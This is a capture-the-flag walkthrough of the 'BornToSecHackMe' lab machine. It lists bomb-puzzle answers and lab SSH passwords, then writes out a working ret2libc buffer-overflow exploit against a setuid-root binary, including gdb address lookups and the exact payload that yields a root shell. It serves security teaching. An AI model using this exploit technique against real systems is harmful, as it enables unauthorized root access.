Now that we've completed all phases, we see this result:

```
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Public speaking is very easy.
Phase 1 defused. How about the next one?
1 2 6 24 120 720
That's number 2.  Keep going!
1 b 214
Halfway there!
9
So you got that one.  Try this one.
opekmq
Good work!  On to the next...
4 2 6 3 1 5
Congratulations! You've defused the bomb!
```

In the PDF, there was a note saying that if your password is 123456, you should make it 123546.


Therefore, our SSH password for thor is:

```thor - Publicspeakingisveryeasy.126241207201b2149opekmq426135```



Yes, now we are connected to thor via ssh and we have two files.
```
thor@BornToSecHackMe:~$ ls -la
total 37
drwxr-x--- 3 thor     thor   129 Oct 15  2015 .
drwxrwx--x 1 www-data root    60 Oct 13  2015 ..
-rwxr-x--- 1 thor     thor     1 Oct 15  2015 .bash_history
-rwxr-x--- 1 thor     thor   220 Oct  8  2015 .bash_logout
-rwxr-x--- 1 thor     thor  3489 Oct 13  2015 .bashrc
drwx------ 2 thor     thor    43 Oct 15  2015 .cache
-rwxr-x--- 1 thor     thor   675 Oct  8  2015 .profile
-rwxr-x--- 1 thor     thor    69 Oct  8  2015 README
-rwxr-x--- 1 thor     thor 31523 Oct  8  2015 turtle
```

```
-rwxr-x--- 1 thor     thor    69 Oct  8  2015 README
-rwxr-x--- 1 thor     thor 31523 Oct  8  2015 turtle
```

```
thor@BornToSecHackMe:~$ cat README
Finish this challenge and use the result as password for 'zaz' user.
```

When we researched Turtle a bit, we saw that it is a drawing tool library belonging to python.

Then we wrote a script according to the string we have.

[drawTurtle.py](scripts/drawTurtle.py)


It simply says **`SLASH`** on the screen.

Now that it says **`Can you digest the message? :)`**

```
thor@BornToSecHackMe:~$ echo -n "SLASH" | md5sum

646da671ca01bb5d84dbb5fb2238dc8e  -
```
We can log in to the user **`zaz`**.


```zaz : 646da671ca01bb5d84dbb5fb2238dc8e```



When we log in as the zaz user, we encounter the following;

```
-rwsr-s--- 1 root     zaz  4880 Oct  8  2015 exploit_me
drwxr-x--- 3 zaz      zaz   107 Oct  8  2015 mail
```

```
zaz@BornToSecHackMe:~$ du mail/
1       mail/.imap/INBOX.Drafts
1       mail/.imap/INBOX.Sent
1       mail/.imap/INBOX.Trash
2       mail/.imap
3       mail/
```

The mail folder was completely empty.

Now we download the **`exploit_me`** program to our host machine to analyze it.


```
bool main(int param_1,int param_2)

{
  char local_90 [140];
  
  if (1 < param_1) {
    strcpy(local_90,*(char **)(param_2 + 4));
    puts(local_90);
  }
  return param_1 < 2;
}

```

```
#include <stdio.h>
#include <string.h>

bool main(int argc, int argv) {
    char buffer[140];

    if (argc > 1) {
        strcpy(buffer, *(char **)(argv + 4));
        puts(buffer);
    }

    return argc < 2;
}

```

When we analyze the code, we see that it allocates a 140-byte space, but because it uses strcpy, there is a vulnerability here.

How will we exploit this vulnerability?

```
zaz@BornToSecHackMe:~$ gdb ./exploit_me 


GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.


(gdb) b main
Breakpoint 1 at 0x80483f7


(gdb) run
Starting program: /home/zaz/exploit_me

Breakpoint 1, 0x080483f7 in main ()
```

Next, we need to get the address of the system function because the command we will essentially execute is:
**`system("/bin/sh");`**

```
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```
```
system = 0xb7e6b060
little endian = \x60\xb0\xe6\xb7
```

Now that we have obtained the memory address of the system function, we need to use "/bin/sh" next. Using the libraries that the program uses, we will search for the **`"/bin/sh"`** command.

```
(gdb) info proc map


process 2962
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
         0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
        0xb7e2b000 0xb7e2c000     0x1000        0x0
        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd2000 0xb7fd5000     0x3000        0x0
        0xb7fdb000 0xb7fdd000     0x2000        0x0
        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb)
```

As we can see in the memory address range between **`0xb7e2c000`** and **`0xb7fd2000`**, it uses **`/lib/i386-linux-gnu/libc-2.15.so`**.
Let's search for **`"/bin/sh"`** in this memory range.

```
(gdb) find 0xb7e2c000,0xb7fd2000,"/bin/sh"
0xb7f8cc58
1 pattern found.
```

``` 
"/bin/sh" = 0xb7f8cc58 
little endian = \x58\xcc\xf8\b7
```

Now that we have reached our goal, we have a memory address for the system function plus another memory address for "/bin/sh".

Therefore, it's time to exploit the vulnerability.

```
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print "A"*140 + "\x60\xb0\xe6\xb7" + "A"*4 + "\x58\xcc\xf8\xb7"')

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��AAAAX���

# whoami
root

# id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
```


### How did we exploit the vulnerability?

```
Let's break down each component of our exploit:

1. Buffer Overflow with "A"*140
   - Fills the buffer with 140 'A' characters
   - Overflows past the buffer's boundaries
   - Overwrites the saved EBP (Base Pointer)
   - Positions us to control the return address (EIP)

2. System Function Address "\x60\xb0\xe6\xb7"
   - Address of libc's system() function
   - Written in little-endian format
   - Overwrites the return address
   - Program execution will jump here

3. Return Address Placeholder "A"*4
   - 4 bytes of dummy data
   - Would normally be the return address after system() call
   - Not important since we won't return from shell
   - Could be any 4 bytes of data

4. Shell String Address "\x58\xcc\xf8\xb7"
   - Points to "/bin/sh" string in memory
   - Found in libc memory space
   - Written in little-endian format
   - Passed as argument to system()
```

FINALLY WE ARE ROOT #1 ;D
